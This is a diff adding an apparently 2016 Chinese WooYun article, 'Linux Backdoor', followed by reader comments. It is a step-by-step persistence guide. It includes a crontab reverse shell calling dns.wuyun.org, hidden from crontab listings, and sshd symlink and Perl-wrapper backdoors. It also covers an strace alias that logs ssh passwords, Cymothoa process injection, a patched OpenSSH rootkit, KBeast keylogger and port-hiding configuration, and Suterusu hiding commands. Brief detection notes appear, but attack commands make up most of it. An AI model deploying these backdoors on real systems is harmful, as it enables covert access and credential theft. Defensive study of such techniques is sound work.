@@ -1,0 +1,118 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Linux Backdoor</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">L3m0n</a> <span class="bull">·</span> <time title="2016/05/16 10:23" ui-time="" datetime="2016/05/16 10:23" class="published ng-binding ng-isolate-scope">2016/05/16 10:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>前一段时间学习一小部分内网的小笔记，<a href="http://zone.wooyun.org/content/26415">http://zone.wooyun.org/content/26415</a></p><p>结果没想到好像还是比较受欢迎，也是第一次被劈雷。最近办比赛遇上了rookit种植，感觉很无奈，所以自己也就研究了一下，内容都是一些以前的技术，也是为下面的笔记再次增加一章(windows下的域权限维持可以多看看三好学生师傅的文章)。大牛飘过。</p><p>笔记地址：<br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p><p>测试环境:centos 6.5</p><h1>0x01 crontab</h1><hr><p>计划任务,永远的爱</p><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p><pre><code>#!bash
+(crontab -l;printf "*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
+</code></pre><h1>0x02 硬链接sshd</h1><hr><p>上了防火墙的坑...测试前关闭一下吧</p><pre><code>#!bash
+service iptables stop
+</code></pre><p>出现：ssh: connect to host 192.168.206.142 port 2333: No route to host</p><pre><code>#!bash
+ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
+ssh <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2d0cdcdd6e2939b908c93949a8c9092948c939690">[email&#160;protected]</a> -p 2333
+</code></pre><p>用root/bin/ftp/mail当用户名,密码任意</p><p>后门排查：</p><pre><code>#!bash
+netstat -anopt
+</code></pre><p>查找有问题的进程</p><pre><code>#!bash
+ps -ef | grep pid
+ls -al /tmp/su
+kill -9 pid
+rm -rf /tmp/su
+</code></pre><p><img alt="p1" img-src="a53b7270d8b79b0d5cee34a7d203d1c95506a0c6.jpg"></p><h1>0x03 SSH Server wrapper</h1><hr><p>条件：开启ssh，如果不连接是没有端口进程的，而且last也看不到</p><pre><code>#!bash
+cd /usr/sbin
+mv sshd ../bin
+echo '#!/usr/bin/perl' &gt;sshd
+
+echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd
+
+echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' &gt;&gt;sshd
+chmod u+x sshd
+//不用重启也行
+/etc/init.d/sshd restart
+</code></pre><p>kali下的执行</p><pre><code>#!bash
+socat STDIO TCP4:192.168.206.142:22,sourceport=13377
+</code></pre><p>对于源端口的修改：</p><pre><code>#!python
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; buffer = struct.pack('&gt;I6',19526)
+&gt;&gt;&gt; print repr(buffer)
+'\x00\x00LF'
+&gt;&gt;&gt; buffer = struct.pack('&gt;I6',13377)
+&gt;&gt;&gt; print buffer
+4A
+</code></pre><p>后门排查：</p><pre><code>#!bash
+netstat -anopt
+//查看一下sshd进程情况,如果发现不是/usr/sbin/目录下面,就有问题
+ll /proc/1786
+cat /usr/sbin/sshd
+</code></pre><p><img alt="p2" img-src="86f128b0364e1fae54517eb6e6ca0a348985417d.jpg"></p><p>还原：</p><pre><code>#!bash
+rm -rf /usr/sbin/sshd; mv /usr/bin/sshd ../sbin;
+</code></pre><h1>0x04 SSH keylogger</h1><hr><p>vim当前用户下的.bashrc文件,末尾添加</p><pre><code>#!bash
+alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'
+</code></pre><p>然后使配置生效</p><pre><code>#!bash
+source .bashrc
+</code></pre><p>当本地su或者ssh的时候,就会在tmp下面记录(无论失败成功都有记录)</p><p><img alt="p3" img-src="72a7f32abc61945fdb919f71bd092f9ad774e8ea.jpg"></p><h1>0x05 Cymothoa_进程注入backdoor</h1><hr><p>很赞的点是注入到的进程,只要有权限就行,然后反弹的也就是进程相应的权限(并不需要root那样),当然进程重启或者挂了也就没了.当然动作也是很明显的。</p><p>线程注入：</p><pre><code>#!bash
+./cymothoa -p 2270 -s 1 -y 7777
+</code></pre><p><img alt="p4" img-src="d40b6bb83559c8c646c0f955ef88188a7a509a05.jpg"></p><pre><code>#!bash
+nc -vv ip 7777
+</code></pre><h1>0x06openssh_rookit</h1><hr><p>下载地址：<a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</a></p><p>先patch</p><pre><code>#!bash
+wget http://mirror.corbina.net/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
+tar zxvf openssh-5.9p1.tar.gz
+cp sshbd5.5p1.diff openssh-5.9p1/
+cd openssh-5.9p1
+patch &lt; sshbd5.9p1.diff
+</code></pre><p>安装依赖</p><pre><code>#!bash
+yum install zlib-devel
+yum install openssl-devel
+yun install pam-devel
+yun install krb5-lib(没安装)
+</code></pre><p>修改includes.h</p><p><img alt="p5" img-src="3fb1798fc7ed4cf764c215042dda724a32080a21.jpg"></p><p>编译安装再重启sshd服务</p><pre><code>#!bash
+./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+make &amp;&amp; make install &amp;&amp; service  sshd restart
+</code></pre><p>利用：</p><p>会记录登入登出的ssh账号密码(错误的也会记录),配置文件中设置的密码,也可以通过ssh然后root登陆。</p><p><img alt="p6" img-src="54b4ad0151f4b1b95f6dd6b5ae053aa105426679.jpg"></p><p>发现：</p><p><img alt="p7" img-src="a3515c60092eb379da3f0b7b2a35b6590fb68d57.jpg"></p><p>找到可疑sshd并且查看一下last的登陆ip，最后kill他们的进程,清除暂时不知</p><h1>0x07 Kbeast_rootkit</h1><hr><p><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz</a></p><pre><code>#!bash
+tar -zxvf ipsecs-kbeast-v1.tar.gz
+cd kbeast-v1/
+vi config.h
+</code></pre><p>重要配置：</p><pre><code>#!cpp
+//键盘记录
+#define _LOGFILE_ "acctlog"
+
+//rookit产生的日志配置文件所存储位置(此位置是被隐藏的)
+#define _H4X_PATH_ "/usr/_h4x_"
+
+//telnet端口(端口也是隐藏的,netstat是看不到的)
+#define _HIDE_PORT_ 23333
+
+//telnet的端口以及返回回来的用户名(必须能调用/sh/bash,否则安装会出现Network Daemon错误)
+#define _RPASSWORD_ "lolloltest"
+#define _MAGIC_NAME_ "root"
+</code></pre><p>利用：</p><p>1、记录：</p><p><img alt="p8" img-src="1b8d14d0efe6fa2fb86b41892924cb172c7818ab.jpg"></p><p>2、telnet连接</p><p><img alt="p9" img-src="fbff76876774fad4aa12afabce2eb5688dafa793.jpg"></p><ul><li>缺点：重启就会失效,需要放入启动项</li><li>优点：相比上面都是需要ssh相关或者是有一个低权限维持才能发挥的一个后门,这个是直接开放一个独立的端口</li></ul><p>发现：其实感觉修改一下进程名,发现还是有点麻烦</p><p><img alt="p10" img-src="b0df89ef98caf22603e72c30e4bd0f6fe6f19dc3.jpg"></p><h1>0x08 Mafix + Suterusu rookit</h1><hr><p>1、Mafix</p><pre><code>#!bash
+./root lolloltest 23333
+</code></pre><p>这样就会产生一个端口为23333,root密码也可以用lolloltest登陆的ssh,端口不隐藏</p><p><img alt="p11" img-src="4b9ee5fbe9588cbf481f43fb0bc991e18f5dbdc0.jpg"></p><p>这时候就可以用Suterusu配合使用</p><p>2、Suterusu</p><p>功能表：</p><pre><code>#!bash
+Get root
+$ ./sock 0
+Hide PID
+$ ./sock 1 [pid]
+Unhide PID
+$ ./sock 2 [pid]
+Hide TCPv4 port
+$ ./sock 3 [port]
+Unhide TCPv4 port
+$ ./sock 4 [port]
+Hide TCPv6 port
+$ ./sock 5 [port]
+Unhide TCPv6 port
+$ ./sock 6 [port]
+Hide UDPv4 port
+$ ./sock 7 [port]
+Unhide UDPv4 port
+$ ./sock 8 [port]
+Hide UDPv6 port
+$ ./sock 9 [port]
+Unhide UDPv6 port
+$ ./sock 10 [port]
+Hide file/directory
+$ ./sock 11 [name]
+Unhide file/directory
+$ ./sock 12 [name]
+</code></pre><p>编译：</p><pre><code>#!bash
+make linux-x86 KDIR=/lib/modules/$(uname -r)/build
+gcc sock.c -o sock
+//加载模块
+insmod suterusu.ko
+</code></pre><p>结合Mafix使用(隐藏端口):</p><pre><code>#!bash
+./sock 3 [port]
+</code></pre><p><img alt="p12" img-src="6482d49639a88423f93f4aebc663b972ea4ae408.jpg"></p><h1>0x09 参考资料</h1><hr><ul><li><a href="https://www.aldeid.com/wiki/Cymothoa">https://www.aldeid.com/wiki/Cymothoa</a></li><li><a href="http://phrack.org/issues/68/9.html">http://phrack.org/issues/68/9.html</a></li><li><a href="http://www.joychou.org/index.php/web/ssh-backdoor.html">http://www.joychou.org/index.php/web/ssh-backdoor.html</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2016-05-21 03:04:00</span></div><p></p><p>0x04 SSH keylogger<br>su 不行吧 ！？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">4ido10n</span> <span class="reply-time">2016-05-19 21:11:25</span></div><p></p><p>Get√</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ByStudent</span> <span class="reply-time">2016-05-18 17:41:02</span></div><p></p><p>师傅写得好，已收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">anon</span> <span class="reply-time">2016-05-17 08:37:20</span></div><p></p><p>0x02 硬链接sshd<br>没有硬链接啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜萌</span> <span class="reply-time">2016-05-16 13:24:09</span></div><p></p><p>围观大师傅</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">柠檬牛的大弟子</span> <span class="reply-time">2016-05-16 10:31:50</span></div><p></p><p>师傅~~</p><p></p></div></div></div></div></div></main>
